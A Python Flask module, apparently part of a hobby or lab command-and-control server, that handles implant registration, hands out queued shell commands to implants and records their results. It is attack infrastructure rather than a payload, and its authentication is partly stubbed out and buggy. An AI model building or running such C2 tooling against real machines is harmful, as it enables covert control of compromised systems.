"""
    This file stores all the functions that are used to interact with the agent from the server
"""

from c2_config import *
from c2_database import *

@login_manager.user_loader
def load_user(user_id):
    """
       a required function for flask-login
    """
    if not agent_exist(user_id):
        return None
    else:
        return find_agent_by_id(user_id)

@app.route('/agent/register', methods=["POST"]) # support only POST requests
def register_agent(): # --> this is a handler
    """
        listens to the /register_agent route
        and processes the registration request from agents
    """
    # request.json -> this will be how we are getting data from implant
    reg_data = request.json # storing registration data
    reg_password = reg_data["password"]
    reg_whoami = reg_data["whoami"]
    reg_agent_id = reg_data["agent_id"]

    if reg_agent_id == None or reg_password == None:
        return jsonify({"status": "failed to get data from implant"})

    if not agent_exist(reg_agent_id): ## if agent does not exist already
        hashed_password, salt = hash_password(reg_password)
        agent = Agent(agent_id=reg_agent_id, username=reg_whoami, password=hashed_password, salt=salt)
        db.session.add(agent)
        db.session.commit() ## saves the data to the database

    #TODO: need to change this part so that password is properly verified
    if verify_agent_password(reg_agent_id, reg_password):
        print(f"[+] a new agent has successfully registered: {agent.agent_id}, {agent.username}")
        agent = find_agent_by_id(reg_agent_id)
        agent.authenticated = True
        login_user(agent) ## user loader function required from flask-login
        print(f"[+] agent {agent.agent_id} has been authenticated")
        
        return jsonify({"status": "ok", "message": "Welcome!"})
    else:
        # print("[-] authentication failed")
        return jsonify({"status": "authentication failed"})


@app.route('/agent/send_task', methods=['POST'])
# @login_required
def send_task():
    """
        listens to the /task route
        When an implant asks for a new task, this function will query the database
        and see if the client has issued any task to that specific agent
        If so, return the task (a list of commands) in a json format
        If not, return an empty json (or something else)
    """
    data = request.json ## getting a request from task route
    if data == None:
        return jsonify({"status": "no data received from agent"})

    #TODO: need a better way to hide how the agent identifies itself
    agent_id = data["agent_id"] ## need to verify agent_id 
    password = data["password"] ## and password 
    agent = find_agent_by_id(agent_id)
    if not agent_exist(agent_id):
        return jsonify({"status": "agent not found"})
    if not agent.is_authenticated:
        return jsonify({"status": "agent not authenticated"})

    task = find_agent_task(agent_id)
    if task == None:
        return jsonify({})
    else:
        # update the status of task to TASKED
        task.job_status = TASKED
        db.session.commit()
        return jsonify({"job_id": task.job_id,"command_type": task.command_type, "cmd": task.cmd, "status": "ok"})
    
@app.route('/agent/get_results', methods=['POST'])
# @login_required
def get_results():
    """
        listens to the /task_results route
        When an implant sends back the results of a task, this function will store the results
        in the database
    """
    data = request.json
    if data == None:
        return jsonify({"status": "error: no data"})
    agent_id = data["agent_id"]
    password = data["password"]
    results = data["results"]
    job_id = data["job_id"]
    agent = find_agent_by_id(agent_id)
    if not agent_exist(agent_id):
        return jsonify({"status": "agent not found"})
    if not agent.is_authenticated:
        return jsonify({"status": "agent not authenticated"})

    print(f"[+] agent {agent_id} has successfully completed the task# {job_id}")
    print(f"[+] here are the results: {results}")
    # agent = find_agent_by_id(agent_id)
    task = find_task_by_jobID(job_id)
    if task == None:
        return jsonify({"status": "task not found"})
    task.job_status = DONE
    db.session.commit()
    return jsonify({"status": "ok"})